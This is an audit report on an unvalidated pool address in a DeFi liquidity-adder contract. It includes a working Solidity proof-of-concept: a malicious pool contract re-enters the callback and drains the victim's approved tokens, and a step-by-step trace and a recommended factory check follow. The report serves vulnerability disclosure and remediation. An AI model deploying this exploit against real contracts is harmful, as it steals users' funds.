Audit Report

## Title
Unvalidated Pool Address in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain Victim's Approved Tokens via Callback - (File: metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol)

## Summary
`MetricOmmPoolLiquidityAdder._addLiquidity` stores a caller-supplied `pool` address into transient context without any factory registry check, then calls `addLiquidity` on it. A malicious contract passed as `pool` can immediately call back into `metricOmmModifyLiquidityCallback`, trivially satisfy the only caller-identity guard (`msg.sender == expectedPool`), supply attacker-controlled token addresses via `getImmutables()`, and cause the adder to execute `safeTransferFrom(payer, maliciousPool, amount)` — draining up to the victim's full approved balance in a single transaction.

## Finding Description
`_addLiquidity` at line 193 stores the unvalidated `pool` directly into transient pay context and immediately calls `addLiquidity` on it:

```solidity
_setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
try IMetricOmmPoolActions(pool)
  .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) ...
```

The malicious pool's `addLiquidity` re-enters `metricOmmModifyLiquidityCallback`. The only caller-identity guard at line 164 is:

```solidity
if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
```

Because `expectedPool` was set to the malicious contract, `msg.sender == expectedPool` is trivially true. The amount cap check at line 165 also passes when the attacker requests exactly the cap values. The callback then calls `IMetricOmmPool(msg.sender).getImmutables()` at line 169 — which the malicious pool controls — and executes:

```solidity
pay(token0, payer, msg.sender, amount0Delta);
pay(token1, payer, msg.sender, amount1Delta);
```

`pay` in `PeripheryPayments` at line 86 resolves to `IERC20(token).safeTransferFrom(payer, recipient, value)`, transferring tokens directly from the victim (`payer = msg.sender` of the original call) to the malicious pool. The attacker controls both the token addresses (via `getImmutables()`) and the amounts (up to the victim-supplied caps).

`MetricOmmSwapRouterBase._setNextCallbackContext` at line 29-31 demonstrates the correct pattern — it calls `_requireFactoryPool(pool)` before storing any pool in transient context, and `_requireExpectedCallbackCaller` at line 82-85 additionally re-checks `FACTORY.isPool(caller)` in the callback. `MetricOmmPoolLiquidityAdder` has neither check anywhere in its call path. The NatSpec at lines 19-21 acknowledges this gap but provides no security control.

## Impact Explanation
Any user who has granted a token approval to `MetricOmmPoolLiquidityAdder` can have up to their full approved balance drained in a single transaction. The attacker controls both the token addresses and the amounts up to the victim-supplied caps. This is a direct, complete loss of user principal with no recovery path once the transaction executes, meeting the Critical/High direct loss of user principal threshold.

## Likelihood Explanation
The attack requires only that a victim call `addLiquidityExactShares` or `addLiquidityWeighted` with an attacker-supplied pool address. This is a realistic phishing vector: a malicious frontend, a compromised UI, or social engineering can present a fake pool address as legitimate. Users who have pre-approved the adder (a common gas-efficiency pattern) are permanently at risk until they revoke the approval. No privileged access is required by the attacker.

## Recommendation
Add a factory registry check in `_addLiquidity` before storing the pool in transient context, mirroring the pattern in `MetricOmmSwapRouterBase`:

```solidity
function _addLiquidity(address pool, ...) internal ... {
    if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    ...
}
```

This requires storing the factory address as an immutable in `MetricOmmPoolLiquidityAdder`, exactly as `MetricOmmSwapRouterBase` does at line 20. Alternatively, validate at each public entry point (`addLiquidityExactShares`, `addLiquidityWeighted`) before any external call is made. Additionally, the callback should re-check `FACTORY.isPool(msg.sender)` as `MetricOmmSwapRouterBase._requireExpectedCallbackCaller` does.

## Proof of Concept

```solidity
contract MaliciousPool {
    address immutable token;
    address immutable adder;
    uint256 immutable victimMax;

    constructor(address _token, address _adder, uint256 _victimMax) {
        token = _token; adder = _adder; victimMax = _victimMax;
    }

    function addLiquidity(address, uint80, LiquidityDelta calldata,
                          bytes calldata callbackData, bytes calldata)
        external returns (uint256, uint256)
    {
        IMetricOmmModifyLiquidityCallback(adder)
            .metricOmmModifyLiquidityCallback(victimMax, 0, callbackData);
        return (victimMax, 0);
    }

    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = token;
        imm.token1 = address(0);
    }
}

// Victim has approved adder for `token`
adder.addLiquidityExactShares(
    address(maliciousPool), victim, 0,
    LiquidityDelta({binIdxs: [int256(0)], shares: [uint256(1)]}),
    VICTIM_MAX, 0, ""
);
// Result: VICTIM_MAX of `token` transferred from victim to maliciousPool
```

Execution trace:
1. `addLiquidityExactShares(maliciousPool, ...)` → `_addLiquidity` (line 67)
2. `_setPayContext(maliciousPool, victim, VICTIM_MAX, 0)` — malicious pool stored as expected (line 193)
3. `maliciousPool.addLiquidity(...)` called (line 194)
4. `maliciousPool` calls back `metricOmmModifyLiquidityCallback(VICTIM_MAX, 0, abi.encode(1))`
5. `msg.sender == expectedPool` ✓ (both are `maliciousPool`); `VICTIM_MAX <= max0` ✓ (line 164-166)
6. `token0 = maliciousPool.getImmutables().token0` → attacker's chosen token (line 169-170)
7. `pay(token, victim, maliciousPool, VICTIM_MAX)` → `safeTransferFrom(victim, maliciousPool, VICTIM_MAX)` (lines 172-173, PeripheryPayments line 86)